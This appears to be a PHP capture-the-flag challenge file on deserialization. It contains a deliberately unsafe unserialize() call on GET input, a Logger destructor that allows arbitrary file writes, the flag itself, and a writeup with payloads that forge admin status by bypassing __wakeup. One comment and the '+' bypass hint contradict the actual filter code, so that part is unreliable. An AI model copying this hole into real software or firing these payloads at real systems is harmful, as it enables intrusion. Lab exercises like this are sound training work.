<?php
/*
 * 题目2: 反序列化入门
 * 考察点: PHP反序列化漏洞、魔术方法、对象属性修改
 * 难度: 简单
 * Flag: flag{uns3r1al1z3_m4g1c_m3th0d}
 */

error_reporting(0);
highlight_file(__FILE__);

class User {
    public $username;
    public $password;
    private $isAdmin = false;
    protected $secretKey = "defaultKey";
    
    public function __construct($username, $password) {
        $this->username = $username;
        $this->password = $password;
    }
    
    public function __wakeup() {
        // 安全检查：重置管理员状态
        $this->isAdmin = false;
        echo "User {$this->username} loaded.<br>";
    }
    
    public function __destruct() {
        if ($this->isAdmin === true) {
            echo "Welcome Admin! Here is your flag: flag{uns3r1al1z3_m4g1c_m3th0d}<br>";
        } else {
            echo "Goodbye, {$this->username}!<br>";
        }
    }
    
    public function __toString() {
        return "User: " . $this->username;
    }
}

class Logger {
    public $logFile;
    public $content;
    
    public function __destruct() {
        if (isset($this->logFile) && isset($this->content)) {
            file_put_contents($this->logFile, $this->content);
            echo "Log written to {$this->logFile}<br>";
        }
    }
}

if (isset($_GET['data'])) {
    $data = $_GET['data'];
    
    // 简单的过滤
    if (preg_match('/O:\d+:"User"/', $data)) {
        // 检查属性数量是否被修改（防止绕过__wakeup）
        echo "Deserializing...<br>";
        unserialize($data);
    } else {
        echo "Invalid User object format!";
    }
} else {
    // 给出示例
    $example = new User("guest", "123456");
    echo "Example serialized data: " . serialize($example) . "<br>";
    echo "Hint: Try to become admin!<br>";
}

/*
Writeup:
考察点：
1. private和protected属性的序列化格式
2. __wakeup绕过（修改属性数量）
3. 对象属性修改

解题步骤：
1. 首先了解User类的序列化格式
2. private属性格式：\x00类名\x00属性名
3. protected属性格式：\x00*\x00属性名
4. 绕过__wakeup：修改对象的属性数量（将O:4:"User":4改为O:4:"User":5）

Payload（URL编码后）：
O:4:"User":5:{s:8:"username";s:5:"admin";s:8:"password";s:6:"123456";s:13:"%00User%00isAdmin";b:1;s:12:"%00*%00secretKey";s:10:"defaultKey";}

或者使用+号绕过正则：
O:+4:"User":5:{s:8:"username";s:5:"admin";s:8:"password";s:6:"123456";s:13:"%00User%00isAdmin";b:1;s:12:"%00*%00secretKey";s:10:"defaultKey";}
*/
?>
